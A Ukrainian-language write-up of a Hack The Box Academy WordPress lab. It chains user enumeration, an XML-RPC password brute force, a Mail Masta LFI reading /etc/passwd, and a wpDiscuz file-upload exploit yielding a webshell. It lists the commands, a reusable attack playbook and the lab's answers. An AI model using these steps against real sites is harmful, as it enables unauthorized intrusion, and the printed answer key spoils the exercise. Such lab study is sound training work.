# Attacking Common Applications — WordPress: Full Attack Chain (Enum → Brute Force → LFI → RCE)

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [WordPress](https://academy.hackthebox.com/app/module/113/section/1208)
Ціль: 10.129.81.69 (blog.inlanefreight.local)
Q1 Відповідь: `doug`
Q2 Відповідь: `jessica1`
Q3 Відповідь: `webadmin`
Q4 Відповідь: `l00k_ma_unAuth_rc3!`

## Концепція

Це повний ланцюжок компрометації WordPress-сайту без початкових креденшлів: **user enumeration → password brute force через XML-RPC → LFI в застарілому плагіні (privesc recon) → RCE через інший вразливий плагін (wpDiscuz) → читання прапорів у файловій системі**. Кожен крок логічно готує наступний: спершу знаходимо валідного юзера, потім підбираємо йому пароль, паралельно через окрему вразливість (LFI) розвідуємо систему на рівні ОС, і нарешті використовуємо третю вразливість (file upload RCE) для повного виконання команд.

## Крок 1 — Реєстрація vhost і базова спроба REST API enum

```bash
echo '10.129.81.69 blog.inlanefreight.local' | sudo tee -a /etc/hosts

curl -s http://blog.inlanefreight.local/wp-json/wp/v2/users | jq
```

Пояснення: WordPress REST API (`/wp-json/wp/v2/users`) у стандартній конфігурації публічно віддає список юзерів у JSON. Тут запит повернув невалідний JSON (`jq: parse error`) — типова ознака того, що ендпоінт заблокований плагіном безпеки або перевизначений темою, тож переходимо до альтернативного методу.

## Крок 2 — Спроба enum через ?author=N (класичний метод)

```bash
for i in 1 2 3 4 5; do
  curl -s -I "http://blog.inlanefreight.local/?author=$i" | grep -i location
done
```

Пояснення: WordPress за замовчуванням редіректить `/?author=N` на `/?author=username` в заголовку `Location`, розкриваючи логін через нумерацію ID. Порожній результат означає, що і цей вектор або заблокований, або редіректи вимкнені — переходимо до автоматизованого інструменту.

## Крок 3 — User enumeration через WPScan (aggressive mode)

```bash
wpscan --url http://blog.inlanefreight.local --enumerate u
```

Пояснення: WPScan комбінує кілька passive/aggressive технік одночасно — RSS generator, author ID brute forcing, login error messages — тобто пробує всі вектори з кроків 1-2 і більше, автоматично. Знайдено двох юзерів: `admin` (Rss Generator + Login Error Messages) та `doug` (Author ID Brute Forcing, підтверджено Login Error Messages).

**Відповідь Q1: `doug`**

Бонус з цього ж скану — виявлено супутні слабкості: XML-RPC увімкнено (`xmlrpc.php` доступний), директорія `/wp-content/uploads/` має відкритий листинг, версія WordPress 5.8 (застаріла) — все це знадобиться далі.

## Крок 4 — Пошук словника rockyou.txt (типова "де він?" проблема в Kali/Pwnbox)

```bash
ls -la /usr/share/wordlists/ | grep -i rockyou
```

Пояснення: у Kali/HTB Pwnbox словник rockyou традиційно лежить у `/usr/share/wordlists/rockyou.txt.gz` — стисненим, щоб економити місце на диску. Команда підтвердила наявність архіву (`53357329` байт).

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
ls -la /usr/share/wordlists/ | grep -i rockyou
```

Пояснення: `gunzip` розпаковує архів на місці (видаляючи `.gz`), результат — `rockyou.txt` (139921507 байт, ~14 млн паролів). Якщо файл відсутній взагалі, альтернативні шляхи для пошуку словників:

```bash
locate rockyou.txt
find / -iname "rockyou*" 2>/dev/null
apt list --installed 2>/dev/null | grep -i wordlist
ls /usr/share/seclists/Passwords/Leaked-Databases/ 2>/dev/null
```

## Крок 5 (Q2) — Password brute force через XML-RPC

```bash
wpscan --url http://blog.inlanefreight.local \
  --usernames doug \
  --passwords /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc
```

Пояснення: `xmlrpc.php` дозволяє викликати метод `wp.getUsersBlogs` для перевірки креденшлів одним HTTP-запитом — це набагато швидше і менш детектується, ніж брутфорс через звичайну форму логіну (`/wp-login.php`), бо XML-RPC підтримує **множинні спроби автентифікації в одному запиті** (`system.multicall`), обходячи навіть деякі rate-limit захисти.

Результат:
```
Username: doug, Password: jessica1
```

**Відповідь Q2: `jessica1`**

## Крок 6 (Q3) — LFI в Mail Masta plugin для розвідки системних юзерів

```bash
curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

Пояснення: раніше (в іншому уроці цього ж модуля) вже було виявлено плагін `mail-masta` версії 1.0 з відомим публічним LFI (CVE / Exploit-DB) — параметр `pl` в `count_of_send.php` передається напряму у файлову операцію без валідації шляху. Читання `/etc/passwd` — стандартна verification-техніка LFI, яка одночасно дає цінну розвідувальну інформацію: список системних акаунтів і їхні login shell'и.

Результат показав список юзерів, серед яких з `/bin/bash` (інтерактивний shell, отже потенційна ціль для lateral movement/privesc):
```
root      → /bin/bash
ubuntu    → /bin/bash
webadmin  → /bin/bash
mrb3n     → /bin/sh   (не bash!)
```

**Відповідь Q3: `webadmin`** (третій юзер з `/bin/bash`, крім типових `root`/`ubuntu`)

## Крок 7 (Q4) — Пошук і завантаження публічного RCE-експлойта (wpDiscuz)

```bash
wget https://www.exploit-db.com/raw/49967 -O wp_discuz.py
```

Пояснення: `wpDiscuz` — ще один встановлений плагін з критичною вразливістю (CVE-2020-24186) — file upload bypass через маніпуляцію MIME-типом (файл завантажується з валідними GIF-магічними байтами `GIF689a;` на початку, обманюючи перевірку типу файлу, а сервер потім виконує його як PHP завдяки помилці конфігурації).

## Крок 8 — Запуск експлойта і отримання веб-шелу

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

Пояснення: прапорець `-p /?p=1` вказує на існуючий пост блогу, де активний коментар-форм (wpDiscuz вбудовується саме в систему коментарів). Скрипт автоматично отримує `wmuSecurity` nonce-токен, формує malicious upload-запит і повертає шлях до вебшелу з рандомізованою назвою:

```
Webshell path: http://blog.inlanefreight.local/wp-content/uploads/2026/07/ugbdvqwgwhnigyx-1783070406.5884.php
```

## Крок 9 — Виконання команд через вебшел

```bash
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/07/ugbdvqwgwhnigyx-1783070406.5884.php?cmd=id"
```

Пояснення: вебшел приймає команди через GET-параметр `cmd`. Відповідь завжди починається з магічних байтів `GIF689a;` (залишок маскування під зображення) — це нормально, реальний вивід команди йде після них:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Крок 10 — Пошук флага у веброуті

```bash
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/07/ugbdvqwgwhnigyx-1783070406.5884.php?cmd=find+/var/www+-iname+'flag*'+2>/dev/null"
```

Пояснення: замінили точний `flag.txt` на маску `flag*`, бо перша знахідка (`/wp-content/uploads/2021/08/flag.txt` = `0ptions_ind3xeS_ftw!`) виявилась флагом **іншого, попереднього уроку** (directory listing), і HTB коректно її відхилила для цього завдання. Розширений пошук знайшов кілька кандидатів у різних vhost-директоріях:

```
/var/www/blog.inlanefreight.local/wp-content/uploads/2021/08/flag.txt          ← старий флаг, НЕ той
/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt    ← правильний для цього уроку
/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt ← флаг з Drupal-уроку
/var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt    ← той же флаг (симлінк/копія)
```

## Крок 11 — Читання правильного флага

```bash
curl -s "http://blog.inlanefreight.local/wp-content/uploads/2026/07/ugbdvqwgwhnigyx-1783070406.5884.php?cmd=cat+/var/www/blog.inlanefreight.local/flag_d8e8fca2dc0f896fd7cb4cb0031ba249.txt"
```

Результат:
```
GIF689a;

l00k_ma_unAuth_rc3!
```

**Відповідь Q4: `l00k_ma_unAuth_rc3!`**

## Чому це працює (root cause для звіту)

- **Опис:** Сайт на WordPress 5.8 з двома критично застарілими плагінами (`Mail Masta 1.0` — LFI, `wpDiscuz 7.0.4` — Unauthenticated RCE через file upload bypass), увімкненим XML-RPC без rate-limiting, і слабким паролем користувача `doug`.
- **Технічні деталі:** `count_of_send.php` в Mail Masta приймає шлях до файлу через параметр `pl` без валідації (path traversal/LFI, CWE-98); wpDiscuz недостатньо перевіряє MIME-тип завантажуваного файлу, дозволяючи завантажити PHP-файл під виглядом зображення (CVE-2020-24186, CWE-434 Unrestricted Upload); `xmlrpc.php` дозволяє необмежену кількість спроб автентифікації через `wp.getUsersBlogs`, обходячи стандартний rate-limit форми логіну.
- **Ризик/Імпакт:** Unauthenticated Remote Code Execution — зловмисник без жодних креденшлів отримує повний контроль над веб-сервером (`www-data`), доступ до читання будь-яких файлів системи, включно з конфігураціями інших vhost'ів на тому ж сервері (Drupal, dev-середовище), що демонструє ризик lateral movement між кількома застосунками на одному хості.
- **Рекомендації:** Негайно оновити/видалити плагіни `Mail Masta` та `wpDiscuz` (обидва мають публічні, добре відомі експлойти); вимкнути XML-RPC, якщо не використовується (`add_filter('xmlrpc_enabled', '__return_false')`); впровадити сильну парольну політику та MFA для адмін-панелі; заблокувати виконання PHP-файлів у директорії `/wp-content/uploads/` через конфігурацію веб-сервера.

## Повний ланцюжок атаки (для звіту)

```
1. VHost/User Enum    → WPScan → знайдено юзера "doug"
2. XML-RPC Brute Force → doug:jessica1 (rockyou.txt)
3. LFI (Mail Masta)    → /etc/passwd → знайдено юзера "webadmin" (/bin/bash)
4. RCE (wpDiscuz)       → CVE-2020-24186 → webshell (www-data)
5. Post-Exploitation    → find + cat → flag: l00k_ma_unAuth_rc3!
```

## Швидкий playbook на майбутнє

```bash
# User enum + password attack одним рядком
wpscan --url http://TARGET --enumerate u
wpscan --url http://TARGET --usernames USER --passwords /usr/share/wordlists/rockyou.txt --password-attack xmlrpc

# LFI recon через відомий вразливий плагін
curl -s "http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

# RCE через wpDiscuz
wget https://www.exploit-db.com/raw/49967 -O wp_discuz.py
python3 wp_discuz.py -u http://TARGET -p /?p=1
curl -s "http://TARGET/wp-content/uploads/YYYY/MM/SHELL.php?cmd=find+/var/www+-iname+'flag*'+2>/dev/null"
```
